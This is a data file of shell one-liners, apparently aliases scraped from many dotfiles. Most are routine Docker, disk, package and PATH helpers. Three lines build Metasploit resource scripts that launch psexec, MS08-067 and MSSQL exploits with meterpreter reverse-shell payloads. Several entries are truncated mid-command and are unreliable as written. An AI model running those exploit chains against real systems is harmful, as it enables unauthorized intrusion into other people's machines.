"fc=$(fc -ln -1); f=`eval $fc | grep "":"" | sed -E ""s/([^:]*):.*/\1/"" | xargs`; code -n $f"
"fc-list | sed 's/^.\+: //;s/:.\+$//;s/,.*$//' | sort -u | pr -2 -T"
"fc -rl 1 | fzf --tiebreak=index | sed ""s/^ *\([0-9]*\*\?\) *//g"" | cbc"
"fc -rl 1 | fzf --tiebreak=index --height=40% | sed ""s/^ *\([0-9]*\*\?\) *//g"" | cbc"
"fc -ln -1 | tr -d ""\n"" | sed ""s/^\s*//g"" | xclip -selection clipboard -i"
"fc -ln -1 | sed ""1s/^[[:space:]]*//"" | awk 1 ORS="""" | pbcopy "
"fasd -a | head -n1 | sed ""s{[^/]*/{/{"" | pbcopy"
"f(){ ps ax | grep ""${1}"" | grep -v grep | awk "
"f(){ lsof -iTCP -sTCP:LISTEN -n -P | awk ""NR == 1 || /:$1./""; unset -f f; }; f"
"f(){ history | grep ""$@"" | tail -n20 | head -n -1; unset -f f; }; f"
"f(){ git branch --merged $1 | egrep -v ""develop|master|sandbox""; }; f"
"f(){ find . -name ""*.$1"" -print0 | xargs -0 cat|grep -v ^$|wc -l; unset -f f; }; f"
"f() { ref=$(g --no-pager stash list | grep ""$1"" | cut -d: -f1 | head -n1); echo ${ref:-<no_match>}; }; f"
"export PS1=""${cyan}\w${TXTFRAME} | ${green}\d \t${TXTFRAME} | ${yellow}\u@\h${TXTFRAME} | ${purple}\s \V${TXTFRAME}\r\n${cyan}\!${TXTFRAME} >$NC "" "
"export PS1=""${chg_term_title}${cyan}\w${TXTFRAME} | ${green}\d \t${TXTFRAME} | ${yellow}\u@\h${TXTFRAME} | ${purple}\s \V${TXTFRAME}\r\n${cyan}\!${TXTFRAME} >$NC "" ;"
"export PATH=$(echo $PATH | tr : ""\n"" | sed ""/code\/hhvm/d"" | paste -s -d : -)"
"export PASSWORD_LENGTH=""${PASSWORD_LENGTH:-32}"" ; cat /dev/urandom | tr -dc a-zA-Z0-9 | fold -w ""${PASSWORD_LENGTH}"" | head -n"
"export AWS_PROFILE=$(grep -iE ""^[]+[^*]"" ~/.aws/credentials | tr -d [| tr -d ] | fzf)"
"expac -HM ""%011m\t%-20n\t%10d""$(comm -23 <(pacman -Qqen | sort) <(pacman -Qqg base base-devel | sort)) | sort -n"
"expac -HM ""%011m\t%-20n\t%10d"" $( comm -23 <(pacman -Qqen|sort) <(pacman -Qqg base base-devel|sort) ) | sort -rn"
"expac -HM ""%011m\t%-20n\t%10d"" $( comm -23 <(pacman -Qqen|sort) <(pacman -Qqg base base-devel|sort) ) | sort -n"
"expac -H M ""%011m\t%-20n\t%10d"" $(comm -23 <(yaourt -Qqen | sort) <(yaourt -Qqa base base-devel | sort)) | sort -n"
"expac -H M ""%011m\t%-20n\t%10d"" $(comm -23 <(pacman -Qqen | sort) <(pacman -Qqg base base-devel | sort)) | sort -n"
"expac -H M ""%011m\t%-20n\t%10d"" $(comm -23 <(pacman -Qqen | sort) <(pacman -Qqg base base-devel | sort )) | sort -n"
"expac -H M ""%011m\t%-20n\t%10d"" $( comm -23 <(yaourt -Qqen|sort) <(yaourt -Qqg base base-devel|sort) ) | sort -n"
"expac -H M ""%011m\t%-20n\t%10d"" $( comm -23 <(pacman -Qqen|sort) <(pacman -Qqg base base-devel|sort) ) | sort -n"
"expac ""%m %n"" | numfmt --to=iec | sort -hr | head -n30"
"eval $(thefuck $(history | tail -n 2 | head -n 1 | cut -d "" "" -f 4-))"
"eval $(history | sed ""s/ *[0-9]* *//"" | sort -u | fzf)"
"eval ""$(docker-machine env default)"" && echo ""nameserver 10.0.0.103"" | docker-machine ssh default ""grep -q 10.0.0.103 /etc/resolv.conf || echo \""nameserver 10.0.0.103\"" >> /etc/resolv.conf"""
"eserv | ack -v ""(^[0-9]+\serrors?$)|(^.*JSHint.*)|(^[a-zA-Z\._]+.*\.js:\sline\s[0-9]+,\scol\s[0-9]+,\s.*\.)"""
"env|sort| egrep ""^PATH|^LD_"""
"env|short|dsed|gack ""^\w+"" --passthru"
"env | grep -iE ""ora|ld|asm"""
"env | egrep --color=never ""OS_(AUTH_URL|TENANT|USERNAME)"""
"eix -I ""(bumblebee|virtualgl|primus|bbswitch)"""
"egrep -v ""^$|^#|^\;|^\/"""
"egrep ""bindkey"" ~/.zshrc| egrep -v ""grep|stty"" | \more"
"egrep ""^(/.+:[0-9+:[0-9]+:.(error|warning):|fatal|===)"""
"echo;echo q | rclone config | grep -Ev "".*\)|e/.*"""
"echo; echo $PYTHONPATH | tr "":"" ""\n"" | cat -n | sort -n -r; echo"
"echo; echo $PATH | tr "":"" ""\n"" | cat -n | sort -n -r; echo"
"echo | alias | sed ""s/=/ /"" | sed ""s/alias/${LIGHT_GREEN}/"""
"echo `ls -l | grep ""^d"" | awk ""{ print $9 }"" | tr -d ""/""`"
"echo `history |tail -n2 |head -n1` | sed ""s/[0-9]* //"""
"echo `cat $(findmakefile) | grep LOCAL_PACKAGE_NAME |egrep -o ""= .*"" | egrep -o ""[A-Za-z0-9].*"" `"
"echo `\ls -lrt|\tail -2|awk ""{print \\$9}""|head -1`"
"echo ; echo -e ""${BWhite} add${NC} (add file for commit) | ${BWhite} mods${NC} (show changes) | ${BWhite}commit${NC} (commit changes) | ${BWhite}push ${NC}(update repo)"" ; echo"
"echo ; cat ~/.fzf.bash |grep -v alias |grep ""()"" | sed s/""() { #""/""\t--->\t""/g ; echo"
"echo 256 | sudo tee -a /proc/sys/fs/inotify/max_user_instances; echo 32768 | sudo tee -a /proc/sys/fs/inotify/max_queued_events; echo 65536 | sudo $
"echo -n `git remote show origin | grep ""Fetch URL"" | cut -d "" "" -f 5`|pbcopy"
"echo -n ""logic cpu num:""; cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c"
"echo -n ""local: "" && ifconfig | grep -i ""inet "" | cut -d "" "" -f 2 | tail -n 1 && echo -n ""extern: "" && curl http://www.icanhazip.com"
"echo -n ""/home/ben.bubnick/prod-global-config-`git branch | grep \* | cut -d "" "" -f2`.json"" | pbcopy"
"echo -e ""ps -ef | grep defunct | awk '{ print $3 }' | xargs kill -9"""
"echo -e ""\n\x1B[34mDesktop\n\x1B[0m"" && ll ~/Desktop | grep \.md && echo -e ""\n\x1B[36mSites\n\x1B[0m"" && ll ~/Sites | grep \.md && echo -e ""\n\x1B[32mJacob\n\x1B[0m"" && ll ~/ | grep \.md"
"echo -e ""HEAD / HTTP/1.0\n\n"" | nc slashdot.org 80 |grep ""^X-"" | grep -v ""^X-Powered-By"""
"echo -e ""GET /images/json?all=1 HTTP/1.0\r\n"" | nc -U /var/run/docker.sock | tail -n +5 | dockviz images --tree"
"echo -e "" pvs "" ; pvs ; echo -e ""\n vgs"" ; vgs ; echo -e ""\n lvs"" ; lvs ; echo ; df -h | egrep -v ""^tmpfs|^udev|^/dev/hdb"""
"echo *|tr "" "" ""n"" |xargs -iFF command du -hs FF|sort"
"echo '%CPU %MEM PID COMMAND' && ps hgaxo %cpu,%mem,pid,comm | sort -nrk1 | head -n 5 | sed -e 's/-bin//'"
"echo $SHELL | grep bash && shopt -p || echo 'Not Bash, run: <setopt> instead'"
"echo $PROMPT_COMMAND | grep -q timer_stop || PROMPT_COMMAND=""timer_stop ; ${PROMPT_COMMAND:-:} ; unset timer"""
"echo $PROMPT_COMMAND | grep -q timer_stop || PROMPT_COMMAND=""${PROMPT_COMMAND:-:} ; timer_stop"""
"echo $PATH | tr -s "":"" ""\n"" | sort | uniq"
"echo $PATH | tr "":"" ""\n"" | sort | nl"
"echo $PATH | tr "":"" ""\n"" | nl | sort"
"echo $? | xclip ; x=`xclip -o` ; while ((1)); do y=`xclip -o` ; [ ""$x"" == ""$y"" ] || { echo $y; x=""$y""; } ; sleep 0.5 ; done"
"echo $(ifconfig | grep -E ""en.:"" -A 3 | grep -oE ""\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"" | head -n 1); python2 -m SimpleHTTPServer"
"echo $(ifconfig tap0 | grep ""inet "" | cut -b 9- | cut -d"" "" -f2)"
"echo $(dd if=/dev/urandom bs=128 count=1 2>/dev/null | base64 | tr --delete ""=+/[:space:]"" | dd bs=32 count=1 2>/dev/null)"
"echo ""use exploit/windows/smb/psexec"" > /tmp/handler.rc && echo ""set payload windows/meterpreter/reverse_tcp"" >> /tmp/handler.rc && echo ""set LHOST `ifconfig -a | grep ""Bcast"" | cut -d "":"" -f2 | cut -d "" "" -f 1`"" >> /tmp/handler.rc && echo ""set ExitOnSession false"" >> /tmp/handler.rc && echo ""show options"" >> /tmp/handler.rc && msfconsole -r /tmp/handler.rc"
"echo ""use exploit/windows/smb/ms08_067_netapi"" > /tmp/handler.rc && echo ""set payload windows/meterpreter/reverse_tcp"" >> /tmp/handler.rc && echo ""set LHOST `ifconfig -a | grep ""Bcast"" | cut -d "":"" -f2 | cut -d "" "" -f 1`"" >> /tmp/handler.rc && echo ""set ExitOnSession false"" >> /tmp/handler.rc && echo ""show options"" >> /tmp/handler.rc && msfconsole -r /tmp/handler.rc"
"echo ""use exploit/windows/mssql/mssql_payload"" > /tmp/handler.rc && echo ""set payload windows/meterpreter/reverse_tcp"" >> /tmp/handler.rc && echo ""set LHOST `ifconfig -a | grep ""Bcast"" | cut -d "":"" -f2 | cut -d "" "" -f 1`"" >> /tmp/handler.rc && echo ""set ExitOnSession false"" >> /tmp/handler.rc && echo ""show options"" >> /tmp/handler.rc && msfconsole -r /tmp/handler.rc"
"echo ""svn st | grep \? | awk \""{print ""\$2""}\"" | xargs svn add"""
"echo ""svn st | grep ! | awk \""{print ""\$2""}\"" | xargs svn delete"""
"echo ""show stat"" | nc -U /var/lib/haproxy/stats | cut -d "","" -f 1,2,5-11,18,24,27,30,36,50,37,56,57,62 | column -s, -t "
"echo ""pts: you are $(tty)"" | egrep /.\* && echo && ps | head -1 && ps auxfh | grep pts/[[:digit:]]"
"echo ""openstack server list | \\grep 1-192-168 | awk \""{ print \$2 }\"" | xargs openstack server delete"""
"echo ""git tag -a v0$(echo ""$(git tag -l | sort -r | head -n 1 | sed -e "
"echo ""git clone git://$(ifconfig | grep ""inet "" | grep -Fv 127.0.0.1 | awk "
"echo ""fr \""*\"" | grep -v \""\./tags:\"" | xargs grep -v xras_summary 2>/dev/null | grep -in --color=always \""STRS\"""""
"echo ""do a \""apt update\""?""; ask_yn_y_callback() { sudo apt update; }; ask_yn_n_callback() { echo """"; }; ask_yn; apt autoremove; echo; get-debian-package-updates | while read -r line; do echo -en ""$line $(echo $line | awk ""{print \$1}"" | get-debian-package-description)\n""; done; echo; sudo apt upgrade; sudo apt autoremove; sudo apt autoclean"
"echo ""`cat /home/ariel/brubsay/phrases.txt | shuf -n 1`"" | xcowsay --image=`ls /home/ariel/brubsay/*.png | shuf -n 1`"
"echo ""USER PID %CPU %MEM COMMAND"" && ""ps"" aux | tail | cut -c1-25,65- | sort -n -k3"
"echo ""Top Processes accesing RAM "" | pv -qL 10 && ps auxf | sort -nr -k 4 | ccze -A"
"echo ""Top Processes accesing CPU "" | pv -qL 10 && ps auxf | sort -nr -k 3 | ccze -A"
"echo ""Symbolic Links:""; lla | cut -d"":"" -f 2 | cut -c 4- | grep ""\->"""
"echo ""Running..."" ; ps aux | grep -i MCMaxLinux | wc -l; echo ""Done..."" ; ls -1 */done | wc -l"
"echo ""Looking for self ip geolocation"" && curl -s ipinfo.io/""$(wget http://ipinfo.io/ip -qO -)"" | egrep -w ""city|region|country"""
"echo ""Local:"" && ifconfig | grep ""inet "" | grep -v 127.0.0.1 | cut -d\ -f2 && echo ""\nPublic:"" && echo `curl -s http://whatismyip.akamai.com/`"
"echo ""Diskspace - Greatly simplified (use df -h for all details)"" && df -h | awk ""/Filesystem/ || /sda1/"""
"echo ""Click on window to kill""; xprop | grep PID | grep -Po ""\d+"" | xargs kill"
"echo ""Attach a device...""; adb tcpip 5555 && (adb shell ip route get 8.8.8.8 | cut -f8 -d\ | tr -cd [:print:]; echo :5555 ) | xargs adb connect"
"echo ""APTITUDE UPGRADE LOG: (Last 20)"" && cat /var/log/aptitude | grep -i ""\[UPGRADE\]"" | tail -n 20 | grep -i ""\[UPGRADE\]"""
"echo ""APTITUDE INSTALL LOG: (Last 20)"" && cat /var/log/aptitude | grep -i ""\[INSTALL\]"" | tail -n 20 | grep -i ""\[INSTALL\]"""
"echo """"; echo ""*** LIST OF ALL DMF SSH ALISES: ***""; echo """"; echo ""$(alias | grep -i ssh | egrep -i ""_dmf|dmf_"") """
"echo """"; echo ""*** LIST OF ALL DMF DBCONN ALISES: ***""; echo """"; echo ""$(alias | grep -i dbconn | egrep -i ""_dmf|dmf_"") ""
"du | grep -v ""/$"" | sort -rh | more"
"du -sx err.txt generated.file succ.txt | sort -n | cut -f 2- | while read a; do du -hs ""$a""; done"
"du -sm `ls -a|grep -v ""^\.$""|grep -v ""^\.\.$""`|sort -n -k1"
"du -sh */ | gsort -rh | grep --color -E ""M\s|$"""
"du -sh err.txt generated.file succ.txt | sort -r -n | grep ""[0-9][G|M]"""
"du -sh err.txt generated.file succ.txt | gsort -rh | grep --color -E ""G\s|$"""
"du -sh $(pwd) && git fetch && git remote prune origin && git branch | grep -v master | grep -v ""$(git symbolic-ref --short -q HEAD)"" | xargs git branch -D && git gc && if [ -f Gemfile ]; then bundle clean; fi && du -sh $(pwd)"
"du -s ^.*(/N) | sort -nr | cut -f 2- | while read a; do du -sh ""$a""; done"
"du -s ./err.txt ./generated.file ./succ.txt | sort -n | tail -10 | awk ""{ printf \"" %10.1fGB %s\n\"", \$1/1024/1024, \$2 }"""
"du -s .*(/N) | sort -nr | cut -f 2- | while read directory; do du -sh ""$directory/""; done"
"du -s .*(/N) | sort -nr | cut -f 2- | while read a; do du -sh ""$a""; done"
"du -s */ | sort -nr | cut -d"" "" -f2 | while read -r x; do du -sh ""$x""; done"
"du -s *(/N) | sort -nr | cut -f 2- | while read directory; do du -sh ""$directory/""; done"
"du -s *(/N) | sort -nr | cut -f 2- | while read a; do du -sh ""$a""; done"
"du -s *(/DN) | sort -nr | cut -f 2- | while read directory; do du -sh ""$directory/""; done"
"du -s *(/DN) | sort -nr | cut -f 2- | while read a; do du -sh ""$a""; done"
"du -s err.txt generated.file succ.txt | sort -n | cut -f 2- | while read a; do du -sh ""$a""; done"
"du -s err.txt generated.file succ.txt | sort -n | cut -f 2- | while read a; do du -hs ""$a""; done;"
"du -s err.txt generated.file succ.txt | sort -n | cut -f 2- | while read a; do du -hs ""$a""; done"
"du -s err.txt generated.file succ.txt . .. | sort -n | cut -f 2- | while read a; do du -hs ""$a""; done"
"du -ma | grep ""\\.[^/]"" | sort -nr | head -n 20"
"du -k err.txt generated.file succ.txt | sort -nr | cut -f2 | xargs -d ""\n"" du -sh"
"du -hs err.txt generated.file succ.txt | sort -n | egrep '(^[[:digit:]]{1,}.?[[:digit:]]?G)|(^[[:digit:]]{3,}M)'"
"du -hS / | perl -ne '(m/\d{3,}M\s+\S/ || m/G\s+\S/) && print'"
"du -h | grep ""^[0-9,]*[MG]"" | sort -hr | less"
"du -h /Users/${USER}/Library/Caches/homebrew | sort -h && echo ""File count: $(ls -p /Users/${USER}/Library/Caches/homebrew/ | grep -v / | wc -l)"""
"du -h err.txt generated.file succ.txt | egrep ""([0-9]{3}M)|([0-9]G)"" | egrep -v ""[^\.]/"""
"du -cksh --exclude=. --exclude=.. -- err.txt generated.file succ.txt . .. 2>/dev/null | sort -rh | head -n21 | hl $RED "".*\ttotal$"" $I_GREEN ""^[0-9.]\+."""
"du -a ~/Scripts/* ~/Documents/* ~/.config/* | awk ""{print \$2}"" | fzf | xargs -r -o $EDITOR"
"du --max-depth=1 | sort -n | cut -f2 | while read f ; do du --max-depth=0 -h ""$f"" ; done"
"dspmq | sed ""s/[()]/ /g"" | awk ""/Running/{print \$2}"" | tr ""\n"" "" "";echo"
"dropbox.py $(dropbox.py help | grep -P ""^ "" | peco | awk ""{print \$1}"")"
"drmi $(docker images | grep $1 | tr -s "" "" | cut -d "" "" -f 3)"
"drill +short myip.opendns.com @resolver1.opendns.com | grep -v -e ""^;"" | grep -v -e ""^[[:space:]]*$"" | awk ""{print \$5}"" "
"dpkg-query -W -f='\${Installed-Size;8}\t\${Status;1}\t\${Package}\n' | grep -v '\\sd\\s' | sort -n | cut -f1,3-"
"dpkg-query -W -f='\${Installed-Size;8}\t\${Status;1}\t\${Package}\n' | gr -v '\\sd\\s' | sort -n | cut -f1,3-"
"dpkg-query --show --showformat='\${Installed-Size}\t\${Package}\n' | sort -rh | head -25 | awk '{print \$1/1024, \$2}'"
"dpkg-query --show --showformat='${Installed-Size}\t${Package}\n' | sort -rh | head -25 | awk '{print $1/1024, $2}'"
"dpkg -l |grep ^rc|awk ""{print \$2}""|sudo xargs dpkg -P"
"dpkg -l | tr -s ' ' | cut -d' ' -f2,3 | grep -i"
"dpkg -l | grep ""^rc"" | cut -d "" "" -f 3 | xargs sudo apt-get purge"
"dpkg -l | grep ""^i"" | awk ""{print $2}"" | xargs --max-args 1 aptitude why"
"dpkg -l linux-* | awk '/^ii/{ print $2}' | grep -v -e `uname -r | cut -f1,2 -d\"
"dpkg --list |grep ""^rc"" | cut -d "" "" -f 3 | xargs sudo dpkg --purge"
"dpkg --list | grep linux-image | grep -E --color ""$(uname -r)|"""
"dpkg --get-selections | grep ""linux-image-[[:digit:]].*"" | tr ""\t"" "";"" | cut -d "";"" -f1"
"docker_name_ip(){ docker ps --format ""{{.Names}}"" | grep $@ | xargs docker inspect -f ""{{.Name}} {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}"" | column -t -s"" "" }; docker_name_ip"
"docker-volumes rm `docker-volumes list | grep docker | cut -d""|"" -f1`"
"docker stop $(docker ps | sed ""1d"" | cut -d"" "" -f1 | tr ""\n"" "" "")"
"docker run -ti --rm -p 8888:8888 -e DISPLAY=$(ifconfig|grep ""inet ""|grep -v 127.0.0.1|cut -d"" "" -f2):0 -v /tmp/.X11-unix:/tmp/.X11-unix -v ""${PWD}/../wcc_pdbbind_data"":/home/jovyan/work --name rdock $USER/rdock"
"docker run -ti --rm -p 8888:8888 -e DISPLAY=$(ifconfig|grep ""inet ""|grep -v 127.0.0.1|cut -d"" "" -f2):0 -v /tmp/.X11-unix:/tmp/.X11-unix -v ""$PWD"":/home/jovyan/work --name relax10 $USER/relax:10_relax"
"docker run -ti --rm -p 8888:8888 -e DISPLAY=$(ifconfig|grep ""inet ""|grep -v 127.0.0.1|cut -d"" "" -f2):0 -v /tmp/.X11-unix:/tmp/.X11-unix -v ""$PWD"":/home/jovyan/work --name relax07 $USER/relax:07_Jupyter"
"docker run -ti --rm -p 8888:8888 -e DISPLAY=$(ifconfig|grep ""inet ""|grep -v 127.0.0.1|cut -d"" "" -f2):0 -v /tmp/.X11-unix:/tmp/.X11-unix -v ""$PWD"":/home/jovyan/work --name relax06 $USER/relax:06_mmass"
"docker run -ti --rm -p 8888:8888 -e DISPLAY=$(ifconfig|grep ""inet ""|grep -v 127.0.0.1|cut -d"" "" -f2):0 -v /tmp/.X11-unix:/tmp/.X11-unix -v ""$PWD"":/home/jovyan/work --name relax03 $USER/relax:03_user_setup"
"docker run -ti --rm -p 8888:8888 -e DISPLAY=$(ifconfig|grep ""inet ""|grep -v 127.0.0.1|cut -d"" "" -f2):0 -v /tmp/.X11-unix:/tmp/.X11-unix -v ""$PWD"":/home/jovyan/work --name relax02 $USER/relax:02_python"
"docker run -ti --rm -p 8888:8888 -e DISPLAY=$(ifconfig|grep ""inet ""|grep -v 127.0.0.1|cut -d"" "" -f2):0 -v /tmp/.X11-unix:/tmp/.X11-unix -v ""$PWD"":/home/jovyan/work --name relax01 $USER/relax:01_packages"
"docker run -ti --rm -p 8888:8888 -e DISPLAY=$(ifconfig|grep ""inet ""|grep -v 127.0.0.1|cut -d"" "" -f2):0 -v /tmp/.X11-unix:/tmp/.X11-unix -v ""$PWD"":/home/jovyan/work --name relax $USER/relax"
"docker run -ti --rm -p 8888:8888 -e DISPLAY=$(ifconfig|grep ""inet ""|grep -v 127.0.0.1|cut -d"" "" -f2):0 -v /tmp/.X11-unix:/tmp/.X11-unix -v ""$PWD"":/home/jovyan/work --name rdock $USER/rdock"
"docker run -ti --rm -p 8888:8888 -e DISPLAY=$(ifconfig|grep ""inet ""|grep -v 127.0.0.1|cut -d"" "" -f2):0 -v /tmp/.X11-unix:/tmp/.X11-unix -v ""$PWD"":/home/jovyan/work --name mybinder $USER/mybinder"
"docker run -ti --rm -p 8888:8888 -e DISPLAY=$(ifconfig|grep ""inet ""|grep -v 127.0.0.1|cut -d"" "" -f2):0 -v /tmp/.X11-unix:/tmp/.X11-unix -v ""$PWD"":/home/jovyan/work --name jupplot $USER/jupplot"
"docker run -ti --rm -p 8888:8888 -e DISPLAY=$(ifconfig|grep ""inet ""|grep -v 127.0.0.1|cut -d"" "" -f2):0 -v /tmp/.X11-unix:/tmp/.X11-unix -v ""$PWD"":/home/jovyan/work --name ipyvolume $USER/ipyvolume"
"docker run -ti --rm -p 8888:8888 -e DISPLAY=$(ifconfig|grep ""inet ""|grep -v 127.0.0.1|cut -d"" "" -f2):0 -v /tmp/.X11-unix:/tmp/.X11-unix -v ""$PWD"":/home/jovyan/work --name drawnmr $USER/drawnmr"
"docker run -ti --rm -e DISPLAY=$(ifconfig|grep ""inet ""|grep -v 127.0.0.1|cut -d"" "" -f2):0 -v /tmp/.X11-unix:/tmp/.X11-unix -v ""$PWD"":/home/developer/work --name relax07 $USER/relax:07_bruker_CompassXport"
"docker run -m 200M --cpus=""1"" williamyeh/java7 java -XX:+PrintFlagsFinal -version | grep -E ""(MAX|Use.*GC|MaxHeapSize)"""
"docker run -m 200M --cpus=""1"" fabric8/java-alpine-openjdk8-jre java -XX:+PrintFlagsFinal -version | grep -E ""(MAX|Use.*GC|MaxHeapSize)"""
"docker run --rm --name $(echo $(pwd | rev | cut -d""/"" -f 1 | rev)) -p 5432:5432 -d postgres"
"docker rmi -f $(docker images | grep ""^<none>"" | tr -s "" "" | cut -d"" "" -f3)"
"docker rmi -f $(docker images | ag ""^<none>"" | sed ""s/ */ /g"" | cut -d "" "" -f3)"
"docker rmi $(docker images | sed ""1 d"" | fzf -m | awk "
"docker rmi $(docker images | peco | sed -e ""s/ */ /g"" | cut -d"" "" -f3)"
"docker rmi $(docker images | grep ""^<none>"" | tr -s "" "" | cut -d "" "" -f 3)"
"docker rmi $(docker images | grep ""<none>"" | tr -s "" "" | cut -d"" "" -f3)"
"docker rm `docker ps -a | tail -n +2 | grep -v "" Up "" | cut -d"" "" -f1`"
"docker rm $(docker ps -a -q) && docker images | grep ""<none>"" | awk ""{ print ""docker rmi "" $3 }"" | bash"
"docker ps | grep -v ""CONTAINER"" | awk ""{print \$1}"" | xargs docker logs -f"
"docker ps | awk ""{print $1}"" | sed ""1d"" | xargs docker kill"
"docker ps -q | xargs docker kill 2>/dev/null || true &&\
"docker ps -q | xargs docker inspect --format '{{.Id}} @{{.Name}} @{{.Config.Image}} @{{.Config.Cmd}} @{{range \$p, \$conf := .NetworkSettings.Ports}}{{\$p}}->{{(index \$conf 0).HostPort}}{{end}} @{{.NetworkSettings.IPAddress}} @{{.State.Status}}' | column -t -s='@' | cut -c 1-5,64-"
"docker ps -as | sed '1,1 d' | cut -d ' ' -f 1 | xargs docker rm"
"docker ps -aq -f ""status=exited"" | xargs docker rm -v && docker images -q -f ""dangling=true"" | xargs docker rmi && docker volume ls -qf dangling=true | xargs docker volume rm"
"docker ps -a | grep Exit | cut -d "" "" -f 1 | xargs docker rm"
"docker ps -a | grep Dead | cut -d"" "" -f 1 | xargs docker rm"
"docker ps -a | grep -v ^CONTAINER | awk ""{print \$1}"" | xargs --no-run-if-empty docker rm"
"docker ps -a | grep -v CONTAINER | cut -d"" "" -f1 | xargs docker stop"
"docker ps -a | grep -v CONTAINER | cut -d"" "" -f1 | xargs docker rm"
"docker ps -a | grep -i exited | cut -d "" "" -f 1 | xargs docker rm"
"docker ps -a | grep ""weeks ago"" | awk ""{print \$1}"" | xargs docker rm"
"docker ps -a | grep ""weeks ago"" | awk ""{print $1}"" | xargs --no-run-if-empty docker rm"
"docker ps -a | grep ""Exited"" | awk ""{print $1}"" | xargs --no-run-if-empty docker rm -fv"
"docker ps -a | grep ""Exited ([^0]*)"" | cut -d"" "" -f1 | xargs -n1 docker rm"
"docker ps -a | cut -d"" "" -f1 | grep -oP .*[0-9]+ | xargs docker rm"
"docker ps -a | awk '{print \$1}' | sed '1d; s,^\(.*\),docker stop \1; docker rm \1,' | sh -s -x"
"docker ps -a -q | xargs --no-run-if-empty --max-args 5 docker rm; docker images | awk ""/<none>/ { print \$3 }"" | xargs --no-run-if-empty --max-args 5 docker rmi"
"docker ps -a -f status=exited | sed ""1d"" | cut -d "" "" -f 1 | xargs docker rm"
"docker ps --format ""table {{.ID}} | {{.Names}} | {{.Status}} | {{.Ports}}"""
"docker ps --format ""table {{.ID}} | {{.Names}} | {{.Status}} | {{.Ports}}"" -f ""name=r*user*"""
"docker ps --all | grep Exited | awk '{print \$1}' | xargs docker rm"""
"docker inspect comex_db | jq -r '.[0].NetworkSettings | [.Networks[].IPAddress,(.Ports|keys[])]'"
"docker images | sed '1,1 d' | perl -anle 'print \$F[2]' | xargs docker rmi"
"docker images | grep none | awk ""{ print $3}"" | xargs docker rmi -f"
"docker images | grep '^<none>' | awk '{print \$3}' | xargs docker rmi"""
"docker images | grep ""^<none>"" | awk ""{print \$3}"" | xargs docker rmi"
"docker images | grep ""^<none>"" | awk ""{print $3}"" | xargs docker rmi"
"docker images | grep ""<none>"" | awk ""{print $3}"" | xargs docker rmi"
"docker images | grep ""<none>"" | awk ""{print $3}"" | xargs docker rmi -f"
"docker images -a | grep -v ^REPOSITORY | awk ""{print \$3}"" | xargs docker rmi"
"docker images -a | grep ""<none>"" | awk ""{print \$3}"" | xargs docker rmi"
"docker images --no-trunc | grep ""<none>"" | col 3 | xargs -r docker rmi"
"docker images --format ""{{.Size}}\t{{.Repository}}\t{{.Tag}}\t{{.ID}}"" | sed ""s/ //"" | sort -h -r | column -t"
"docker images --format ""{{.ID}}\t{{.Tag}}"" | grep ""<none>"" | awk ""{ print \$1}"" | xargs docker rmi"
"docker exec -it `docker ps | tail -n +2 | peco | cut -d "" "" -f1` /bin/bash"
"docker exec -i -t $(docker ps | cut -d "" "" -f1 | grep -v CONT | head -n 1) /bin/bash"
"docker container rm $(dcla | grep ""Exited"" | peco --prompt ""[rm]"" | cut -d"
"docker container ls -a|grep -q drop || (docker run -d --dns=1.1.1.1 --rm --name dropbox -v /opt/dropbox:/home/kaveh dropbox;echo ""Dropbox started..."")"
"docker container ls -a|fzf -m --reverse|cut -d "" "" -f1|sed -e "":a"" -e ""N"" -e ""$!ba"" -e ""s/\n/ /g"""
"dmesg | egrep --color ""ttyUSB|ttyACM|ttyAMA"""
"dk exec -it $(docker ps | grep svcdiscover_api | tr -s "" "" | cut -d "" "" -f 1) /bin/bash"
"diskutil list | grep /dev | sort -r | \
"dig gigapan{1,2,3,4,5,8,9}.gigapan.com | grep gigapan | grep -v \; | sort -u"
"dig +short myip.opendns.com @resolver1.opendns.com; ifconfig -a | grep -o 'inet6\? \(addr:\)\?\s\?\(\(\([0-9]\+\.\)\{3\}[0-9]\+\)\|[a-fA-F0-9:]\+\)' | awk '{ sub(/inet6? (addr:)? ?/, \"
"df -lh|grep -v TimeMachine|grep -v /private/var/vm|awk ' { print \$2,"
"df -lh --output='target,fstype,size,used,avail,pcent' | grep -v -E 'dev|run|sys'"
"df -hT -x tmpfs -x devtmpfs|sed ""/\/boot/D"";echo -e ""\n内存---------------"";free -h|cut -b -43;echo -e ""\n温度---------------"";sensors|grep Core;echo;hddtemp"
"df -h | head -n 1; df -h | grep sd |\
"df -h | grep -E -v ""^/dev/loop|^tmpfs|^udev"""
"df -h | grep ""sd\|Size"" | cat"
"df -h | egrep -i ""sd|uuid|Montado"""
"df -h | egrep ""Size|disk|mapper"""
"df -h | egrep ""Filesystem|minesoc--vg-root|sdb1"""
"df -h . | tail -n1 | tr -s "" "" "" "" | cut -d"" "" -f4"
"df -P -kHl | grep -v tmpfs | grep -v ""dev "" | grep -v run"
"df -H | grep -A 1 -iE ""nfs|ora|nas"""
"devkit server list | grep -E ""int[0-9]+\s+$"" | head -n 1 | xargs devkit server grab"
"deactivate && rmvirtualenv `pwd | rev | cut -f 1 -d ""/"" | rev`"
"ddc logs -f -t --tail=1 | egrep -i ""(warn|error|fail)"""
"dcl -a | grep -F ""_run_"" | cut -d"" "" -f1 | xargs docker rm"
"date -r$(tail -n 2 ~/.zsh_history|head -n 1 | cut -d "":"" -f 2 | tr -d "" "")"
"date -I | sed ""s/-//g"" | tr -d ""\n"" | xsel -b"
"date --help|sed -n ""/^ *%%/,/^ *%Z/p""|while read l;do F=${l/% */}; date +%$F:""|"
"date --help | sed -n ""/^ *%%/,/^ *%Z/p""|while read l;do F=${l/% */}; date +%$F:""|"
"date --help | sed -n ""/^ *%%/,/^ *%Z/p"" | while read l;do F=${l/% */}; date +%$F:""|"
"d ps -a | grep Exit | cut -d "" "" -f 1 | xargs d rm && lsdocs"
"d images | grep ""<none>"" | awk ""{print $3}"" | xargs docker rmi"
"cvs status |& egrep ""^\?|Status"" | grep -v Up-to-date"
"cvs status 2>&1 | egrep ""(^\? |Status: )"" | grep -v Up-to-date"
"cvs st | grep -E ""\?|Status:"" | grep -v ""Up-to-date""; date"
"cvs -z9 -q status 2>&1 | grep Status | egrep -v ""(Up-to|Needs Patch)"""
"cvs -n -q up -A 2>&1 | egrep ""^(U|M|C).*"""
"cut -f1 -d"" "" .bash_history | sort | uniq -c | sort -n"
